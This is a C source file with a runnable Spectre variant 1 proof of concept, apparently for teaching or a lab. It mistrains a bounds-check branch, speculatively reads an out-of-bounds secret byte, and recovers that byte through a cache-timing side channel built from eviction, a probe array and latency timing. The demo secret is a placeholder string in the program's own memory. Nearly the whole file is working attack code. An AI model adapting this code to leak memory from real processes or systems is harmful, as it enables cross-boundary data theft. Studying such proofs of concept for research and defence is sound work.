#define _GNU_SOURCE
#include "timer.h"
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <errno.h>
#include <stdbool.h>

#define PAGE_SIZE 4096
#define SYMBOL_CNT 256

// Turn these up/down to tune SNR on your machine
#ifndef REP
#define REP 300               // more reps => stronger signal
#endif
#ifndef TRAINING_EPOCH
#define TRAINING_EPOCH 50     // more training before 1 attack
#endif

#define BUF_SIZE 256

// ---------- Contiguous placement: [array ...] [secret ...] ----------
static uint8_t *region_base = NULL;
static uint8_t *array_ptr   = NULL;
static char    *secret_ptr  = NULL;
volatile size_t array_size  = 8;

// ---------- Eviction (portable) ----------
#ifndef EVICT_SIZE
#define EVICT_SIZE (128 * 1024 * 1024)  // 128 MiB; bump to 256 MiB if needed
#endif
#define EVICT_STRIDE 64

static unsigned char *evict_buf = NULL;

static inline void init_eviction_buffer(void) {
    if (!evict_buf) {
        if (posix_memalign((void**)&evict_buf, 64, EVICT_SIZE) != 0 || !evict_buf) {
            perror("evict buffer alloc");
            exit(1);
        }
        memset(evict_buf, 0xA5, EVICT_SIZE);
    }
}

static inline void evict_caches(void) {
    init_eviction_buffer();
    volatile unsigned char acc = 0;
    for (size_t i = 0; i < EVICT_SIZE; i += EVICT_STRIDE) acc ^= evict_buf[i];
    (void)acc;
}

// Broad eviction before each victim call
static inline void flush_lines(uint8_t *pages, size_t stride, size_t count) {
    (void)pages; (void)stride; (void)count;
    evict_caches();
}

// Prevent optimizer from eliding values
static inline void _no_opt(int v) { asm volatile("" :: "r"(v) : "memory"); }

// Branchless select (T if pred, else F)
static inline size_t csel(size_t T, size_t F, bool pred) {
    size_t mask = -(size_t)(!!pred);
    return (T & mask) | (F & ~mask);
}

// ---------- Victim (do NOT inline; keep a real branch to mistrain) ----------
#if defined(__GNUC__) || defined(__clang__)
__attribute__((noinline))
#endif
int naive_victim(uint8_t *pages, size_t idx, size_t stride) {
    // Lengthen resolution of the bounds value a bit to widen the speculative window.
    // (Still just a load from memory; no fences.)
    volatile size_t *lenp = &array_size;
    size_t len = *lenp;

    if (idx < len) {
        // Use the out-of-bounds byte (secret) as an index into pages.
        return pages[(size_t)array_ptr[idx] * stride];
    }
    return 0;
}

// Timer helper: return access latency in ns for a pointer
static inline uint64_t time_maccess_ns(void *ptr) {
    uint64_t ticks = timer_time_maccess(ptr);
    double ns = timer_ticks_to_ns(ticks);
    return (uint64_t)(ns + 0.5);
}

static void recover_argmin(char *out_char, uint64_t *scores, size_t symbols) {
    uint64_t best = UINT64_MAX;
    size_t best_idx = 0;
    for (size_t i = 0; i < symbols; ++i) {
        if (scores[i] < best) { best = scores[i]; best_idx = i; }
    }
    *out_char = (char)best_idx;
}

void naive_attacker(void) {
    if (timer_init(true, 0.2) != 0) {
        fprintf(stderr, "timer_init failed\n");
        return;
    }

    // --- Calibrate (just for prints; decoder uses relative times) ---
    const int reps = 20000;
    unsigned char *calib = NULL;
    if (posix_memalign((void**)&calib, 64, 4096) != 0 || !calib) {
        perror("alloc calib");
        timer_shutdown();
        return;
    }
    memset(calib, 0xA5, 4096);

    uint64_t sum_cached = 0, sum_evicted = 0;
    for (int i = 0; i < reps; ++i) sum_cached += timer_time_maccess(&calib[0]);
    for (int i = 0; i < reps; ++i) { evict_caches(); sum_evicted += timer_time_maccess(&calib[0]); }

    double avg_cached_ns  = timer_ticks_to_ns(sum_cached)  / reps;
    double avg_evicted_ns = timer_ticks_to_ns(sum_evicted) / reps;
    printf("Avg cached access:   %.2f ns\n", avg_cached_ns);
    printf("Avg evicted access:  %.2f ns\n", avg_evicted_ns);

    // --- Channel pages ---
    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (pages == MAP_FAILED) { perror("mmap pages"); free(calib); timer_shutdown(); return; }
    memset(pages, 1, PAGE_SIZE * SYMBOL_CNT);
    size_t stride = PAGE_SIZE;

    // --- Contiguous region: array then secret ---
    size_t region_size = PAGE_SIZE * 8;
    region_base = mmap(NULL, region_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (region_base == MAP_FAILED) { perror("mmap region"); munmap(pages, PAGE_SIZE * SYMBOL_CNT); free(calib); timer_shutdown(); return; }
    memset(region_base, 0, region_size);

    array_ptr = region_base;
    for (size_t i = 0; i < array_size; ++i) array_ptr[i] = (uint8_t)i;

    size_t secret_offset = PAGE_SIZE;
    secret_ptr = (char*)(region_base + secret_offset);
    const char *secret_content = "The cake is a lie!";
    strncpy(secret_ptr, secret_content, BUF_SIZE - 1);

    size_t malicious_index = (uintptr_t)secret_ptr - (uintptr_t)array_ptr;
    printf("Array ptr: %p, Secret ptr: %p, Malicious index: %#zx\n",
           (void*)array_ptr, (void*)secret_ptr, malicious_index);
    printf("-----------------------------------------\n");

    size_t secret_len = strnlen(secret_ptr, BUF_SIZE - 1);
    if (secret_len == 0) secret_len = 1;
    if (secret_len > BUF_SIZE - 1) secret_len = BUF_SIZE - 1;

    char recovered[BUF_SIZE]; memset(recovered, 0, sizeof(recovered));
    // Sum of probe times per symbol — lower is better (argmin)
    uint64_t *scores = calloc(SYMBOL_CNT, sizeof(*scores));
    if (!scores) { perror("scores alloc"); munmap(region_base, region_size); munmap(pages, PAGE_SIZE * SYMBOL_CNT); free(calib); timer_shutdown(); return; }

    for (size_t c = 0; c < secret_len; ++c) {
        memset(scores, 0, SYMBOL_CNT * sizeof(*scores));

        for (size_t r = 0; r < REP; ++r) {
            for (size_t t = 0; t < TRAINING_EPOCH; ++t) {
                bool is_attack = (t == TRAINING_EPOCH - 1);
                size_t index = csel(malicious_index + c, 0, is_attack);

                // Evict working sets so the taken/not-taken decision is delayed and the pages start cold.
                flush_lines(pages, stride, SYMBOL_CNT);

                int vv = naive_victim(pages, index, stride);
                _no_opt(vv);
            }

            // Probe: accumulate raw times and choose the *fastest* page (argmin)
            for (size_t i = 0; i < SYMBOL_CNT; ++i) {
                size_t idx = (i * 167 + 13) % SYMBOL_CNT;
                uint8_t *ptr = pages + stride * idx;
                scores[idx] += time_maccess_ns(ptr);
            }
        }

        recover_argmin(&recovered[c], scores, SYMBOL_CNT);
        printf("Recovered so far: %.*s\n", (int)(c + 1), recovered);
    }

    printf("\nFinal recovered secret (argmin): '%s'\n", recovered);

    free(scores);
    munmap(region_base, region_size);
    munmap(pages, PAGE_SIZE * SYMBOL_CNT);
    free(calib);
    timer_shutdown();
}

int main(void) {
    naive_attacker();
    return 0;
}
